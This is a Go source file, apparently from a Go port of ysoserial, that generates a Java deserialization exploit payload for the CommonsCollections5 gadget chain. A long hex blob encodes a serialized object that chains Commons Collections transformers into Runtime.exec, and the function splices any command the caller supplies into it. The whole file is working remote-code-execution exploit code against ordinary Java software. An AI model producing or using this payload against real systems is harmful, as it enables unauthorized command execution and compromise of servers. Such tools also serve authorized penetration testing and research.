package gadget

import (
	"bytes"
	"encoding/hex"
	"github.com/EmYiQing/Gososerial/ysoserial/util"
	"strings"
)

const CC5 = "CommonsCollections5"

func GetCommonsCollections5(cmd string) []byte {
	prefix := "ACED00057372002E6A617661782E6D616E6167656D656E742E4261644174747" +
		"2696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C" +
		"000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612" +
		"E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E" +
		"6C616E672E5468726F7761626C65D5C635273977B8CB0300044C00056361757365740" +
		"0154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573" +
		"736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547" +
		"261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E" +
		"743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7" +
		"574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E53" +
		"7461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000077" +
		"372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A" +
		"2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C6" +
		"1737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E61" +
		"6D6571007E000578700000005174002679736F73657269616C2E7061796C6F6164732" +
		"E436F6D6D6F6E73436F6C6C656374696F6E7335740018436F6D6D6F6E73436F6C6C65" +
		"6374696F6E73352E6A6176617400096765744F626A6563747371007E000B000000337" +
		"1007E000D71007E000E71007E000F7371007E000B0000002874002779736F73657269" +
		"616C2E7061796C6F6164732E7574696C2E5061796C6F616452756E6E6572243174001" +
		"25061796C6F616452756E6E65722E6A61766174000463616C6C7371007E000B000000" +
		"2171007E001271007E001371007E00147371007E000B0000004874002C79736F73657" +
		"269616C2E7365636D67722E45786563436865636B696E6753656375726974794D616E" +
		"6167657274002045786563436865636B696E6753656375726974794D616E616765722" +
		"E6A61766174000B63616C6C577261707065647371007E000B0000002174002579736F" +
		"73657269616C2E7061796C6F6164732E7574696C2E5061796C6F616452756E6E65727" +
		"1007E001374000372756E7371007E000B0000005C71007E000D71007E000E7400046D" +
		"61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F646" +
		"9666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E000778" +
		"72002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F64696669616" +
		"26C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176" +
		"612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E4" +
		"1727261794C6973747881D21D99C7619D03000149000473697A657870000000007704" +
		"000000007871007E002478737200346F72672E6170616368652E636F6D6D6F6E732E6" +
		"36F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AAD" +
		"D29B39C11FDB0200024C00036B657971007E00014C00036D617074000F4C6A6176612" +
		"F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F" +
		"6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7" +
		"910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D" +
		"6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6" +
		"F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63" +
		"746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015" +
		"B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D" +
		"6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002" +
		"D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E54" +
		"72616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F726" +
		"72E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F" +
		"72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C0" +
		"00969436F6E7374616E7471007E00017870767200116A6176612E6C616E672E52756E" +
		"74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6" +
		"D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B657254" +
		"72616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6" +
		"A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00" +
		"055B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C61737" +
		"33B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C" +
		"02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C6" +
		"16E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D65" +
		"74686F647571007E003C00000002767200106A6176612E6C616E672E537472696E67A" +
		"0F0A4387A3BB34202000078707671007E003C7371007E00357571007E003900000002" +
		"707571007E003900000000740006696E766F6B657571007E003C00000002767200106" +
		"A6176612E6C616E672E4F626A656374000000000000000000000078707671007E0039" +
		"7371007E0035757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91" +
		"D7B47020000787000000001"
	finalCmd := bytes.Buffer{}
	finalCmd.WriteString("74")
	data := strings.ToUpper(hex.EncodeToString([]byte(cmd)))
	if len(data)/2 > 0xFFFF {
		return []byte{}
	}
	dataLen := util.Int16ToBytes(uint16(len(data) / 2))
	finalCmd.WriteString(dataLen)
	finalCmd.WriteString(data)
	suffix := "740004657865637571007E003C0000000171007E00417371007E00317372001" +
		"16A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C" +
		"7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787" +
		"000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103" +
		"000246000A6C6F6164466163746F724900097468726573686F6C6478703F400000000" +
		"00000770800000010000000007878"
	ser, err := hex.DecodeString(prefix + finalCmd.String() + suffix)
	if err != nil {
		return []byte{}
	}
	return ser
}
